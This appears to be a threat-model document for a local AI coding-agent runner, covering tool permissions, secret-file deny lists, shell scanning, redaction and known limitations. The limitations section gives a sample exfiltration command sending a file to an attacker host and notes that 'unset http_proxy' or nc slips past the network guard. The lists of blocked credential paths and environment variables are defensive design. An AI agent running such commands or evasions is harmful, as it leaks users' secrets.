# Runner Threat Model

## Scope

This document is about the **runner**: the local agent loop, tool permissions, file access, shell access, transcripts,
archives, and traces. The bridge/OAuth layer is the model transport boundary, not the main subject of ongoing runner
design work.

The current design goal is a small default surface with explicit opt-ins. Read tools are convenient, write tools are
guarded, recovery tools are always available, shell is hidden by default, and advanced patch mode is opt-in.

## Bridge auth boundary for this playground

This playground remains **OAuth-only** at the transport layer. Upstream Anthropic calls must use a Claude Code OAuth
Bearer token. Anthropic Console API-key sources are intentionally ignored so local test results do not mix billing paths.

Sensitive bridge diagnostics are also gated: `/v1/debug` requires the local `x-claude-local-bridge-debug-token` printed
in the Claude Local Bridge Output log. That token is a local debug door code, not an upstream Claude credential.

## What the model can touch

| Category     | Tools                                                  | Scope                                                                                                                                                                                                          |
| ------------ | ------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Read**     | `list_files`, `read_file`, `search_text`, `glob`, `git_status` | Any file inside `cwd` (and its subdirectories) that passes the deny matrix. Git metadata only.                                                                                                                 |
| **Session**  | `manage_tasks`                                         | In-session task checklist stored in the session file; no filesystem access.                                                                                                                                    |
| **Orchestration** | `spawn_agent`                                     | Spawns a child runner subprocess with a chosen agent profile. Top-level only (`spawnDepth === 0`). Asks by default; capped at 8 spawns per run. Child inherits cwd deny matrix; cannot recurse.              |
| **Worktree**  | `enter_worktree`, `exit_worktree`, `list_worktrees` | Multiple named **slots** per run (`slot` parameter); each creates an isolated git worktree on a fresh branch and switches cwd. Re-enter a slot to switch between parallel worktrees. `list_worktrees` lists active slots and orphan dirs under `~/.bridge-runner/worktrees/`. Requires a git repo. Asks by default; `cleanup=true` removes the worktree and branch. |
| **Skills**    | `run_skill`                                       | Loads a skill Markdown body by name from `.bridge-runner/skills/` or `.cursor/skills/`. Read-only text return — does not execute embedded shell or network instructions. |
| **Write**    | `edit_file`, `write_file`                              | Any file inside `cwd` that passes the deny matrix. Backups saved before mutation. Requires user confirmation (or `--accept-edits`).                                                                            |
| **Recovery** | `undo`, `undo_edit`                                    | Restore files from `.bridge-runner/backups/` or the in-memory undo log. Auto-approved.                                                                                                                         |
| **Advanced** | `apply_patch`                                          | Patch-style edits. Hidden from the default tool surface; opt in explicitly with `--tools apply_patch` or a custom tool list. Requires the same write confirmations and path checks as other write tools.       |
| **Shell**    | `bash`, `manage_shell_jobs`                            | Run shell commands inside `cwd`. **Opt-in only** (`--allow-shell`). Synchronous `bash` is bounded by timeout (default 30s) and output limits (10KB). `manage_shell_jobs` runs background commands (max 8 per run) with poll/kill; same shell-policy scanner applies. Filtered environment. Shell argument scanning blocks dangerous path references. |

## File-based agents (`--agent <name|path>`)

Markdown agent files (YAML frontmatter + prompt body) can extend built-in `--agent` profiles. They are loaded from
`.bridge-runner/agents/` or an explicit path the user passes on the CLI.

| Risk                          | Mitigation                                                                 |
| ----------------------------- | -------------------------------------------------------------------------- |
| Untrusted third-party prompts | Body is appended to the system prompt only; cannot bypass deny matrix     |
| Tool widening                 | Frontmatter `tools` are mapped to the runner catalog; unknown tools dropped |
| Network egress                | `WebFetch`, `WebSearch`, and MCP tool names are always dropped             |
| Shell without consent         | `Bash` maps to `bash` only when `--allow-shell` is already set           |
| Path escape via `--agent`     | User-directed path (like `--system-prompt-file`); not auto-scanned        |

Built-in profile ids always take precedence over file agents with the same name.

## What the model can NEVER touch

These are enforced at the permission layer **before any tool executes**. No CLI flag can override them.

### Secret files (deny matrix)

Path patterns that are **always denied** for both read and write:

| Pattern             | Examples blocked                                                                         |
| ------------------- | ---------------------------------------------------------------------------------------- |
| `.env` files        | `.env`, `.env.test`, `.envrc`, `.env.example`                                            |
| SSH/credential dirs | `.ssh/`, `.aws/`, `.claude/`, `.gnupg/`                                                  |
| Private keys        | `id_rsa`, `id_ed25519`, `*.pem`, `*.key`, `*.p8`, `*.p12`, `*.pfx`                       |
| Credential files    | `credentials*.json`, service-account JSON, Firebase admin SDK JSON, `*.netrc`, `*.npmrc` |
| Token files         | Files matching `token*`, `*_token`, `*secret*`                                           |
| System dirs         | `.git/`, `node_modules/`                                                                 |

### Path escapes

- **Absolute paths** (`/etc/passwd`) → denied before realpath check
- **`../` traversal** that escapes `cwd` → caught by realpath containment
- **Symlink escapes** → `fs.realpathSync` resolves the true path and checks against `cwd`

### Shell restrictions (when `bash` is enabled)

- **Blocked path patterns** in command text: `.env`, `.ssh/`, `.aws/`, `.claude/`, `.gnupg/`, `id_rsa`, `id_ed25519`, `*.pem`, `*.key`, `*.p8`, `*.p12`, service-account names
- **Blocked env var references**: `$ANTHROPIC_API_KEY`, `$AWS_ACCESS_KEY_ID`, `$GH_TOKEN`, `$SSH_AUTH_SOCK` (and braced `${}` variants)
- **Filtered environment**: `execSync` runs with scrubbed `process.env` — no `AWS_*`, `ANTHROPIC_*`, `CLAUDE_*`, `OPENAI_*`, `GH_TOKEN`, `NPM_TOKEN`, or `SSH_AUTH_SOCK`

## How protections compose

```
User prompt
  → validateCwd() rejects system dirs and non-existent paths
  → evaluateWorkspaceTrust() — no tools until cwd is consented (--trust-workspace or interactive y)
  → Runner sends model request through the local bridge
  → Model returns tool_use blocks
  → permissions.check():
      1. confinePath() — realpath containment → deny on escape
      2. isPathBlockedByDenyMatrix() — glob patterns → deny on match (severity: hard_deny)
      3. Shell arg scanning — command text inspection → deny on pattern (severity: hard_deny)
      4. Category-based decision — allow/ask/deny with severity metadata
  → If ask: user confirms interactively
  → tool.execute() runs with:
      - safeEnv for shell commands (stripped process.env)
      - cwdRealpath confinement
  → runAndScrub() redacts secrets from result text
  → Result flows into messages, transcript, stream-json
```

## Workspace trust gate (P0)

Before any tool runs, the runner checks whether `--cwd` has been explicitly trusted on this machine.

| Mode                 | Behavior                                                               |
| -------------------- | ---------------------------------------------------------------------- |
| Interactive TTY      | Prompts once; records consent in `~/.bridge-runner/trust.json`         |
| CI / non-interactive | Requires `--trust-workspace`; fail closed with `workspace_not_trusted` |
| Prior consent        | Skips prompt when fingerprint matches stored record                    |

**Effect:** Untrusted workspaces cannot read or write files — not even read-only tools. Hooks and auto-memory writes also require workspace trust plus `--trusted-workspace` where applicable.

## Permission severity

| Severity          | Meaning                                             | Bypass                                                            |
| ----------------- | --------------------------------------------------- | ----------------------------------------------------------------- |
| `hard_deny`       | Deny matrix paths, path escapes, shell scanner hits | Never — survives `--accept-edits`, `--dont-ask`, and `--chaos-ok` |
| `bypassable_ask`  | Write/shell in default mode                         | `--accept-edits` or user confirmation                             |
| `bypassable_deny` | Shell disabled                                      | `--allow-shell`                                                   |

## `--chaos-ok` (explicit risky mode)

The flag `--chaos-ok` is required to combine `--allow-shell`, `--accept-edits`, and `--dont-ask` in one run. It removes most interactive prompts but **does not** disable `hard_deny` path guards (`.env`, `.ssh/`, credentials, etc.).

## Secret redaction (defense in depth)

Even if a blocked file is somehow read, the **result text** passes through `scrubSecrets()` before reaching:

- Upstream messages (the model never sees raw secrets)
- Transcript logs (JSONL on disk)
- stream-json output (stdout)
- JSON output (stdout)

Redacted patterns:

| Original                                 | Redacted as                    |
| ---------------------------------------- | ------------------------------ |
| `sk-ant-...` (Anthropic keys)            | `[REDACTED:anthropic_key]`     |
| `sk-...` style API keys                  | `[REDACTED:generic_api_key]`   |
| `-----BEGIN ... PRIVATE KEY-----` blocks | `[REDACTED:private_key_block]` |
| `ghp_...` / `gho_...` (GitHub tokens)    | `[REDACTED:github_token]`      |
| `AKIA...` (AWS access keys)              | `[REDACTED:aws_access_key]`    |
| `Bearer ...` (OAuth tokens)              | `Bearer [REDACTED]`            |
| `eyJ...` (JWTs)                          | `[REDACTED:jwt]`               |
| `SECRET=...` / `TOKEN=...` assignments   | `*= [REDACTED]`                |

## Budget telemetry and token caps

The runner exposes live budget signals for long sessions and nested `spawn_agent` children:

| Flag | Behavior |
| ---- | -------- |
| `--max-wall-clock-ms` | Hard stop when wall time exceeds N ms (existing) |
| `--max-cost-usd` | Hard stop when estimated cost exceeds N USD (existing) |
| `--budget-input-tokens` | Hard stop when cumulative API `input_tokens` reach N; soft warning at 80% |
| `--budget-output-tokens` | Hard stop when cumulative API `output_tokens` reach N; soft warning at 80% |

Stream-json and flight-recorder traces may include `{ type: "budget", input_tokens, output_tokens, wall_ms, spawns, depth }`
at tool boundaries. Soft warnings surface as `budget_warning` events and stderr hints; they do not bypass permission
guards. Child agents inherit the parent's **remaining** token budget via CLI flags on the worker subprocess.

Hard-cap termination stops the loop at the next boundary; it does **not** auto-revert in-flight edits — use recovery
tools (`undo`, run manifests when available) if a partial run must be rolled back.

## Composable tool capability profiles (`--profile`)

Per-tool profiles layer **over** coarse permission flags (`--accept-edits`, `--allow-shell`). They cannot bypass the
hard-deny matrix (`.env`, `.ssh/`, path escapes, shell scanner hits) or the `--chaos-ok` interlock.

| Source | Path |
| ------ | ---- |
| Built-in | `review-only`, `edit-source-no-shell`, `git-readonly-shell` |
| Project | `.bridge-runner/profiles/<name>.json` |
| User | `~/.bridge-runner/profiles/<name>.json` |

Profile JSON supports per-tool `allow`/`deny` and optional constraints (`bash.command_regex`, `write_file.max_bytes`).
Denied tools are **removed** from the model tool list (not merely blocked at execution). List profiles with
`--list-profiles`.

**Composition:** `--profile` applies after `--agent` personality defaults; `--tools` intersects with the profile
exposure set (narrower only).

## Executable hooks (`.bridge-runner/hooks.json`)

Hooks can log lifecycle events or run trusted shell commands when `"action": "exec"` or `"run"` is set.

| Risk | Mitigation |
| ---- | ---------- |
| Arbitrary command execution | Requires workspace trust **and** `"trusted": true` in hooks.json |
| Secret exfiltration via hook output | Hook stdout/stderr pass through `scrubSecrets()` before logging |
| Reading `.env` / keys via hook command | Same `scanShellCommand()` hard-deny patterns as `bash` |
| Network egress | Hook env inherits scrubbed `buildSafeEnv()`; `--no-network` proxy guard applies |
| Runaway hook | `spawnSync` timeout (default 120s, max 120s); output capped at 8KB in hook results |

Exec hooks are **user-configured**, not model-callable. The model cannot add or modify hook commands mid-run.

## Known limitations

### 1. No hard outbound network restriction (mitigated)

The `bash` tool can make outbound HTTP requests (`curl`, `wget`, `nc`). There is no egress filtering at the socket or process level. A determined prompt could exfiltrate project files via `curl -d @secret.txt https://attacker.com`.

**Mitigation in place:** File-level deny matrix prevents reading `.env`, `.ssh/`, `.aws/`, key files. Shell arg scanning rejects obvious attempts to reference these paths. The `--no-network` flag adds a best-effort proxy guard by setting `http_proxy`/`https_proxy` to `127.0.0.1:1` in the bash environment, blocking most HTTP/HTTPS egress.

**Remaining risk:** The proxy env vars can be unset by the command itself (`unset http_proxy && curl ...`). Non-HTTP protocols (DNS, raw TCP via `nc`, `ncat`) are not affected by proxy settings at all. For strong isolation, use macOS `pf` firewall rules (`/etc/pf.conf`) or run the runner inside a network-restricted VM/container.

### 2. File size hard cap

`read_file` has configurable `max_bytes`/`max_lines` defaults (50KB/1000 lines), but the model can override them. A hard cap of 1MB (`MAX_BYTES_HARD_CAP`) is now enforced server-side. Requests exceeding this cap are truncated.

### 3. Shell output size hard cap

`bash` tool output is now truncated at 100,000 characters (100KB). The `execSync`/`spawnSync` buffer is capped at 1MB. Stderr is captured and prefixed with `[stderr]` on success.

### 4. No rate limiting on tool calls

The model can make unlimited tool calls within `max_steps`. There's no per-second or per-minute rate limit on shell commands.

### 5. Transcript contains source code

Transcript JSONL files include tool results (file contents, shell output). These contain project source code. Treat transcripts as sensitive.

Flight-recorder traces are a separate opt-in artifact. `summary` traces keep metadata such as sizes, tool names,
permission decisions, usage counters, response statuses, and header names. `redacted` and `full` traces can also contain
scrubbed prompt bodies, model payloads, tool inputs, tool results, and upstream response previews. Treat those trace
files as sensitive local evidence even though authorization and key-looking fields are redacted.

### 6. Command injection in search_text (mitigated)

The `search_text` tool constructs shell commands from the user's pattern. Shell metacharacters are now properly escaped using single-quote wrapping with internal quote escaping.

### 7. undo/undo_edit/apply_patch path validation (mitigated)

`undo`, `undo_edit`, and `apply_patch` now validate paths through `safety.confinePath()` before operating. This prevents path traversal attacks (e.g., `--path ../../../etc/passwd`).

### 8. write_file content validation (mitigated)

`write_file` now validates that `content` is a string and the path passes `confinePath()`. Missing content returns an error instead of crashing.
